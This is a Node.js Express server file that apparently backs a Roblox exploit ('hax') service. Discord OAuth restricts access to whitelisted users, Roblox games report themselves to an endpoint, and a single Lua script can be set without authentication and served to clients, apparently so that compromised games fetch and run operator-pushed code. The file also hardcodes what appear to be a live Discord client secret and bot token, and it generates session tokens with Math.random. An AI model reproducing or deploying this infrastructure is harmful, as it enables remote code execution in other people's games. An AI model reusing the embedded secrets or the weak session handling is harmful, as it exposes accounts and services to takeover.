const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// =====================================================
// 🔐 DISCORD OAUTH CREDENTIALS
// =====================================================
// 👇 REPLACE THESE STRINGS WITH YOUR ACTUAL VALUES
//    (Keep the quotes, just replace the text inside)
// =====================================================
const DISCORD_CLIENT_ID = '1492694231729307822';
const DISCORD_CLIENT_SECRET = 'NTelU-wqi7kOuKg1KaQ3apw0-0LpflWW';
const GUILD_ID = '1465969033915531451';
const BOT_TOKEN = 'MTQ5MjY5NDIzMTcyOTMwNzgyMg.GCh-kG.ssXY7l04pT42lfcvSwzF8aPn7cXwqB72jwUW4o';
// =====================================================

const DISCORD_REDIRECT_URI = 'https://hax-api-xdi2.onrender.com/api/auth/discord/callback';

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.text({ type: 'text/plain' }));

// In‑memory storage
const games = new Map();
let currentLuaScript = "print('hello world')";
let linkedUsername = '';
const sessions = new Map();

// ========================
// Discord OAuth Routes
// ========================
app.get('/api/auth/discord', (req, res) => {
  const url = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}&response_type=code&scope=identify%20guilds.members.read`;
  res.redirect(url);
});

app.get('/api/auth/discord/callback', async (req, res) => {
  const { code } = req.query;
  if (!code) return res.redirect('https://monoxide.pages.dev/auth/?error=no_code');

  try {
    const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: DISCORD_CLIENT_ID,
      client_secret: DISCORD_CLIENT_SECRET,
      grant_type: 'authorization_code',
      code,
      redirect_uri: DISCORD_REDIRECT_URI,
    }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

    const { access_token } = tokenRes.data;

    const userRes = await axios.get('https://discord.com/api/users/@me', {
      headers: { Authorization: `Bearer ${access_token}` }
    });
    const user = userRes.data;

    const rolesRes = await axios.get(`https://discord.com/api/guilds/${GUILD_ID}/roles`, {
      headers: { Authorization: `Bot ${BOT_TOKEN}` }
    });
    const roleMap = new Map(rolesRes.data.map(r => [r.id, r.name]));

    const memberRes = await axios.get(`https://discord.com/api/guilds/${GUILD_ID}/members/${user.id}`, {
      headers: { Authorization: `Bot ${BOT_TOKEN}` }
    });
    const roleNames = (memberRes.data.roles || []).map(id => roleMap.get(id) || '');
    const isWhitelisted = roleNames.some(name => name.toUpperCase() === 'WHITELISTED');

    if (!isWhitelisted) {
      return res.redirect(`https://monoxide.pages.dev/auth/?error=not_whitelisted&username=${encodeURIComponent(user.username)}`);
    }

    const sessionToken = Math.random().toString(36).substring(2) + Date.now().toString(36);
    sessions.set(sessionToken, { userId: user.id, username: user.username, roles: roleNames });

    res.redirect(`https://monoxide.pages.dev/dashboard/?token=${sessionToken}&username=${encodeURIComponent(user.username)}`);
  } catch (err) {
    console.error('OAuth error:', err.response?.data || err.message);
    res.redirect('https://monoxide.pages.dev/auth/?error=auth_failed');
  }
});

app.get('/api/auth/verify', (req, res) => {
  const token = req.query.token;
  if (!token || !sessions.has(token)) return res.status(401).json({ valid: false });
  res.json({ valid: true, username: sessions.get(token).username });
});

// ========================
// Game reporting
// ========================
app.post('/api/report', (req, res) => {
  const game = req.body;
  if (!game.id && !game.placeId) return res.status(400).json({ error: 'Missing placeId' });

  const placeId = game.id || game.placeId;
  const playing = game.players || game.playing || 0;

  const storedGame = {
    placeId, name: game.name || '', playing, thumbnail: game.thumbnail || '',
    visits: game.visits || '', creator: game.creator || '', creator_id: game.creator_id || '',
    maxPlayers: game.max_players || '', genre: game.genre || '', created: game.created || '',
    voice: game.voice || '', rig: game.rig || '',
    joinUrl: `https://www.roblox.com/games/${placeId}/-`,
    reportedAt: Date.now()
  };

  games.set(placeId, storedGame);
  res.json({ success: true, count: games.size });
});

app.get('/api/games', (req, res) => {
  const now = Date.now();
  const oneHour = 60 * 60 * 1000;
  const activeGames = Array.from(games.values())
    .filter(g => g.playing > 0 && (now - g.reportedAt) < oneHour)
    .sort((a, b) => b.playing - a.playing);
  res.json(activeGames);
});

// ========================
// Script storage
// ========================
app.post('/api/set-script', (req, res) => {
  const { script } = req.body;
  if (typeof script !== 'string') return res.status(400).json({ error: 'Missing script' });
  currentLuaScript = script;
  res.json({ success: true });
});

app.get('/api/get-script', (req, res) => res.json({ script: currentLuaScript }));
app.get('/api/get-lua', (req, res) => res.type('text/plain').send(currentLuaScript));

// ========================
// Username linking
// ========================
app.post('/api/set-username', (req, res) => {
  const { username } = req.body;
  if (typeof username !== 'string') return res.status(400).json({ error: 'Missing username' });
  linkedUsername = username.trim();
  res.json({ success: true, username: linkedUsername });
});

app.get('/api/get-username', (req, res) => res.json({ username: linkedUsername }));

// Cleanup
setInterval(() => {
  const now = Date.now();
  for (const [placeId, game] of games) if (now - game.reportedAt > 3600000) games.delete(placeId);
}, 60000);

app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
